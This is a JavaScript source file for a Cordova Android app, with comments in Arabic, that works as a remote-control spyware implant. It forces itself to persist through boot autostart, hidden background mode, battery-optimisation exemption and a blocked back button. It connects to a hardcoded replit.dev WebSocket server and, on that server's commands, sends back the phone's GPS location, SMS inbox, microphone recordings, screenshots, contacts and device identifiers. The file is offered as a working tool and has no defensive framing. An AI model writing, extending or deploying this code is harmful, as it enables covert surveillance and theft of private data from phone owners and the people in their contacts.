document.addEventListener('deviceready', onDeviceReady, false);

// تخزين الطلبات المستلمة
const receivedRequests = [];
let foregroundServiceStarted = false;

function onDeviceReady() {
  console.log('Device is ready');
  
  // تمكين التشغيل التلقائي عند إعادة التشغيل
  enableAutoStart();
  
  // تمكين خدمة المقدمة (Foreground Service)
  startForegroundService();
  
  // تمكين التشغيل في الخلفية
  enableBackgroundMode();
  
  // تجاوز تحسينات البطارية
  requestBatteryOptimizationExemption();
  
  // معلومات الجهاز
  const deviceInfo = {
    uuid: device.uuid || generateUUID(),
    model: device.model || 'Unknown',
    platform: device.platform || 'Unknown',
    version: device.version || 'Unknown',
    manufacturer: device.manufacturer || 'Unknown',
    battery: null,
    timestamp: new Date().toISOString()
  };
  
  // توليد UUID إذا لم يكن موجوداً
  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
      const r = Math.random() * 16 | 0;
      const v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }
  
  // الحصول على حالة البطارية
  if (navigator.getBattery) {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
      connectToServer(deviceInfo);
      
      // مراقبة تغيرات البطارية
      battery.addEventListener('levelchange', updateBatteryInfo);
      battery.addEventListener('chargingchange', updateBatteryInfo);
      battery.addEventListener('chargingtimechange', updateBatteryInfo);
      battery.addEventListener('dischargingtimechange', updateBatteryInfo);
    }).catch(error => {
      console.error('Battery API error:', error);
      connectToServer(deviceInfo);
    });
  } else {
    connectToServer(deviceInfo);
  }
  
  function updateBatteryInfo() {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
      
      // إرسال تحديث البطارية إلى الخادم
      if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
        window.wsConnection.send(JSON.stringify({
          type: 'device_update',
          deviceId: deviceInfo.uuid,
          deviceInfo: {
            battery: deviceInfo.battery,
            timestamp: new Date().toISOString()
          }
        }));
      }
    });
  }
}

// تمكين التشغيل التلقائي
function enableAutoStart() {
  try {
    if (cordova.plugins.autoStart) {
      cordova.plugins.autoStart.enable();
      cordova.plugins.autoStart.enableBootStart();
      console.log('AutoStart enabled');
    }
  } catch (error) {
    console.error('AutoStart error:', error);
  }
}

// بدء خدمة المقدمة (Foreground Service)
function startForegroundService() {
  try {
    if (cordova.plugins.foregroundService) {
      cordova.plugins.foregroundService.start(
        'التطبيق يعمل', 
        'جارٍ مراقبة الأوامر في الخلفية', 
        'ic_stat_icon',
        1000, // Notification ID
        {}
      );
      foregroundServiceStarted = true;
      console.log('Foreground service started');
    }
  } catch (error) {
    console.error('Foreground service error:', error);
  }
}

// تمكين التشغيل في الخلفية
function enableBackgroundMode() {
  try {
    if (cordova.plugins.backgroundMode) {
      cordova.plugins.backgroundMode.enable();
      cordova.plugins.backgroundMode.setDefaults({
        title: 'التطبيق يعمل في الخلفية',
        text: 'جارٍ مراقبة الأوامر الواردة',
        icon: 'ic_stat_icon',
        color: 'FF0000',
        resume: true,
        hidden: true
      });
      
      // منع إيقاف التطبيق في الخلفية
      cordova.plugins.backgroundMode.on('activate', function() {
        cordova.plugins.backgroundMode.disableWebViewOptimizations();
        // إعادة بدء خدمة المقدمة إذا توقفت
        if (!foregroundServiceStarted) {
          startForegroundService();
        }
      });
      
      cordova.plugins.backgroundMode.on('deactivate', function() {
        console.log('Background mode deactivated');
      });
      
      cordova.plugins.backgroundMode.on('failure', function(error) {
        console.error('Background mode failure:', error);
      });
    }
  } catch (error) {
    console.error('Background mode error:', error);
  }
}

// تجاوز تحسينات البطارية
function requestBatteryOptimizationExemption() {
  try {
    if (cordova.plugins.diagnostic) {
      cordova.plugins.diagnostic.isBatteryOptimizationEnabled(function(enabled) {
        if (enabled) {
          cordova.plugins.diagnostic.requestBatteryOptimizationExemption(function(success) {
            console.log('Battery optimization exemption requested:', success);
          }, function(error) {
            console.error('Battery optimization exemption error:', error);
            // في حالة الفشل، توجيه المستخدم يدوياً
            showBatteryOptimizationDialog();
          });
        }
      }, function(error) {
        console.error('Battery optimization check error:', error);
      });
    } else {
      // توجيه المستخدم يدوياً إذا لم يكن البلجن متوفر
      showBatteryOptimizationDialog();
    }
  } catch (error) {
    console.error('Battery optimization error:', error);
    showBatteryOptimizationDialog();
  }
}

// عرض حوار توجيه المستخدم لتعطيل تحسينات البطارية
function showBatteryOptimizationDialog() {
  try {
    if (navigator.notification) {
      navigator.notification.confirm(
        'لضمان عمل التطبيق بشكل دائم في الخلفية، يرجى تعطيل تحسينات البطارية لهذا التطبيق في إعدادات الهاتف.',
        function(buttonIndex) {
          if (buttonIndex === 1) {
            // محاولة فتح إعدادات البطارية
            openBatterySettings();
          }
        },
        'إشعار مهم',
        ['فتح الإعدادات', 'لاحقاً']
      );
    }
  } catch (error) {
    console.error('Dialog error:', error);
  }
}

// فتح إعدادات البطارية
function openBatterySettings() {
  try {
    if (cordova.plugins.diagnostic) {
      cordova.plugins.diagnostic.switchToBatterySavingSettings();
    }
  } catch (error) {
    console.error('Open battery settings error:', error);
  }
}

function connectToServer(deviceInfo) {
  // استخدام رابط الخادم المقدم
  const wsUrl = 'wss://0c0d4d48-f2d0-4f6b-9a7c-dfaeba1f204e-00-1fpda24jsv608.sisko.replit.dev';
  window.wsConnection = new WebSocket(wsUrl);
  
  wsConnection.onopen = () => {
    console.log('Connected to server');
    
    // تسجيل الجهاز
    wsConnection.send(JSON.stringify({
      type: 'register',
      deviceId: deviceInfo.uuid,
      deviceInfo
    }));
    
    // تحديث حالة الاتصال
    updateConnectionStatus(true);
    
    // إرسال تحديث الجهاز بعد الاتصال
    setTimeout(() => {
      if (wsConnection.readyState === WebSocket.OPEN) {
        wsConnection.send(JSON.stringify({
          type: 'device_update',
          deviceId: deviceInfo.uuid,
          deviceInfo: {
            ...deviceInfo,
            timestamp: new Date().toISOString()
          }
        }));
      }
    }, 2000);
  };
  
  wsConnection.onmessage = (event) => {
    try {
      const data = JSON.parse(event.data);
      
      if (data.type === 'command') {
        console.log('Received command:', data.command);
        // تخزين الطلب المستلم
        receivedRequests.push({
          ...data.command,
          receivedAt: new Date().toISOString()
        });
        
        // تنفيذ الأمر وإرسال الرد
        executeCommand(data.command, (response) => {
          if (wsConnection.readyState === WebSocket.OPEN) {
            wsConnection.send(JSON.stringify({
              type: 'response',
              commandId: data.commandId,
              deviceId: deviceInfo.uuid,
              response: {
                ...response,
                requestData: data.command
              }
            }));
          }
        });
      }
      else if (data.type === 'registered') {
        console.log('Device registered successfully:', data);
      }
      
    } catch (error) {
      console.error('Error processing message:', error);
    }
  };
  
  wsConnection.onerror = (error) => {
    console.error('WebSocket error:', error);
    updateConnectionStatus(false);
  };
  
  wsConnection.onclose = () => {
    console.log('Disconnected from server');
    updateConnectionStatus(false);
    // إعادة الاتصال بعد تأخير أقل
    setTimeout(() => connectToServer(deviceInfo), 3000);
  };
  
  // إرسال نبضات قلبية دورية
  const heartbeatInterval = setInterval(() => {
    if (wsConnection && wsConnection.readyState === WebSocket.OPEN) {
      wsConnection.send(JSON.stringify({ 
        type: 'heartbeat',
        deviceId: deviceInfo.uuid,
        timestamp: new Date().toISOString(),
        receivedRequests: receivedRequests.slice(-20),
        battery: deviceInfo.battery
      }));
    }
  }, 10000); // كل 10 ثوانٍ
  
  // تخزين المؤشر للتحكم فيه لاحقاً
  window.heartbeatInterval = heartbeatInterval;
}

function updateConnectionStatus(isConnected) {
  // تحديث حالة الاتصال في التخزين المحلي
  localStorage.setItem('connectionStatus', isConnected ? 'connected' : 'disconnected');
  localStorage.setItem('lastConnectionTime', new Date().toISOString());
}

function executeCommand(command, callback) {
  console.log('Executing command:', command);
  
  // إضافة commandId للتعقب
  const commandId = Date.now();
  
  switch (command.type) {
    case 'get_location':
      getLocation(commandId, callback);
      break;
    case 'get_sms':
      getSMS(commandId, callback);
      break;
    case 'record_audio':
      recordAudio(commandId, command.duration, callback);
      break;
    case 'get_device_info':
      getDeviceInfo(commandId, callback);
      break;
    case 'get_received_requests':
      getReceivedRequests(commandId, callback);
      break;
    case 'take_screenshot':
      takeScreenshot(commandId, callback);
      break;
    case 'get_contacts':
      getContacts(commandId, callback);
      break;
    default:
      callback({ 
        commandId,
        status: 'error',
        error: 'Unknown command',
        receivedCommand: command
      });
  }
}

function getLocation(commandId, callback) {
  const options = {
    enableHighAccuracy: true,
    timeout: 10000,
    maximumAge: 60000
  };
  
  navigator.geolocation.getCurrentPosition(
    (position) => {
      const locationData = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        altitude: position.coords.altitude,
        altitudeAccuracy: position.coords.altitudeAccuracy,
        heading: position.coords.heading,
        speed: position.coords.speed,
        timestamp: position.timestamp
      };
      
      callback({
        commandId,
        status: 'success',
        location: locationData,
        googleMapsLink: `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`
      });
    },
    (error) => {
      callback({ 
        commandId,
        status: 'error',
        error: 'Location error',
        details: {
          code: error.code,
          message: error.message
        }
      });
    },
    options
  );
}

function getSMS(commandId, callback) {
  if (typeof SMS === 'undefined') {
    return callback({ 
      commandId,
      status: 'error',
      error: 'SMS plugin not available'
    });
  }
  
  const filter = {
    box: 'inbox',
    maxCount: 50,
    indexFrom: 0
  };
  
  SMS.listSMS(
    filter,
    (messages) => {
      callback({
        commandId,
        status: 'success',
        count: messages.length,
        messages: messages.map(msg => ({
          id: msg._id,
          address: msg.address,
          body: msg.body,
          date: msg.date,
          read: msg.read
        }))
      });
    },
    (error) => {
      callback({ 
        commandId,
        status: 'error',
        error: 'SMS error',
        details: error
      });
    }
  );
}

function recordAudio(commandId, duration, callback) {
  duration = duration || 10;
  
  const mediaRecorderOptions = {
    mimeType: 'audio/mp3',
    audioBitsPerSecond: 128000
  };
  
  navigator.mediaDevices.getUserMedia({ audio: true })
    .then(stream => {
      const mediaRecorder = new MediaRecorder(stream, mediaRecorderOptions);
      const audioChunks = [];
      
      mediaRecorder.ondataavailable = event => {
        audioChunks.push(event.data);
      };
      
      mediaRecorder.onstop = () => {
        const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
        
        callback({ 
          commandId,
          status: 'success',
          audio: {
            duration: duration,
            format: 'mp3',
            size: audioBlob.size
          }
        });
        
        stream.getTracks().forEach(track => track.stop());
      };
      
      mediaRecorder.start();
      setTimeout(() => {
        mediaRecorder.stop();
      }, duration * 1000);
    })
    .catch(error => {
      callback({ 
        commandId,
        status: 'error',
        error: 'Audio recording error',
        details: error.message
      });
    });
}

function getDeviceInfo(commandId, callback) {
  const info = {
    cordova: device.cordova,
    model: device.model,
    platform: device.platform,
    uuid: device.uuid,
    version: device.version,
    manufacturer: device.manufacturer,
    isVirtual: device.isVirtual,
    serial: device.serial
  };
  
  callback({
    commandId,
    status: 'success',
    deviceInfo: info
  });
}

function getReceivedRequests(commandId, callback) {
  callback({
    commandId,
    status: 'success',
    requests: receivedRequests.slice(-20),
    count: receivedRequests.length
  });
}

function takeScreenshot(commandId, callback) {
  if (navigator.screenshot) {
    navigator.screenshot.save(function(error, res) {
      if (error) {
        callback({
          commandId,
          status: 'error',
          error: 'Screenshot error',
          details: error
        });
      } else {
        callback({
          commandId,
          status: 'success',
          screenshot: {
            filePath: res.filePath,
            fileUri: res.fileUri
          }
        });
      }
    }, 'jpg', 50, 'screenshot_' + commandId);
  } else {
    callback({
      commandId,
      status: 'error',
      error: 'Screenshot plugin not available'
    });
  }
}

function getContacts(commandId, callback) {
  if (navigator.contacts) {
    const options = new ContactFindOptions();
    options.filter = "";
    options.multiple = true;
    const fields = [navigator.contacts.fieldType.displayName, navigator.contacts.fieldType.name, navigator.contacts.fieldType.phoneNumbers];
    
    navigator.contacts.find(fields, function(contacts) {
      callback({
        commandId,
        status: 'success',
        count: contacts.length,
        contacts: contacts.map(contact => ({
          displayName: contact.displayName,
          name: contact.name ? contact.name.formatted : '',
          phoneNumbers: contact.phoneNumbers ? contact.phoneNumbers.map(phone => phone.value) : []
        }))
      });
    }, function(error) {
      callback({
        commandId,
        status: 'error',
        error: 'Contacts error',
        details: error
      });
    }, options);
  } else {
    callback({
      commandId,
      status: 'error',
      error: 'Contacts plugin not available'
    });
  }
}

// إعادة الاتصال عند استئناف التطبيق
document.addEventListener('resume', () => {
  console.log('App resumed, checking connection...');
  if (!window.wsConnection || window.wsConnection.readyState !== WebSocket.OPEN) {
    console.log('Reconnecting...');
    onDeviceReady();
  }
}, false);

// عند دخول التطبيق في الخلفية
document.addEventListener('pause', () => {
  console.log('App paused, maintaining connection...');
  // الحفاظ على الاتصال
  if (cordova.plugins.backgroundMode) {
    cordova.plugins.backgroundMode.enable();
  }
  // إعادة بدء خدمة المقدمة
  setTimeout(() => {
    if (!foregroundServiceStarted) {
      startForegroundService();
    }
  }, 1000);
}, false);

// عند بدء التشغيل التلقائي
document.addEventListener('deviceready', function() {
  // التأكد من جميع الخدمات
  setTimeout(() => {
    enableAutoStart();
    startForegroundService();
    enableBackgroundMode();
  }, 2000);
});

// مراقبة حالة الشبكة
document.addEventListener('online', function() {
  console.log('Device is online');
  // إعادة الاتصال عند العودة للإنترنت
  setTimeout(() => {
    onDeviceReady();
  }, 1000);
}, false);

document.addEventListener('offline', function() {
  console.log('Device is offline');
  updateConnectionStatus(false);
}, false);

// إعادة الاتصال عند إعادة التشغيل
window.addEventListener('load', function() {
  setTimeout(() => {
    onDeviceReady();
  }, 3000);
});

// منع إغلاق التطبيق بالكامل
document.addEventListener('backbutton', function(e) {
  e.preventDefault();
  // بدلاً من إغلاق التطبيق، ننقله للخلفية
  if (cordova.plugins.backgroundMode) {
    cordova.plugins.backgroundMode.moveToBackground();
  }
}, false);
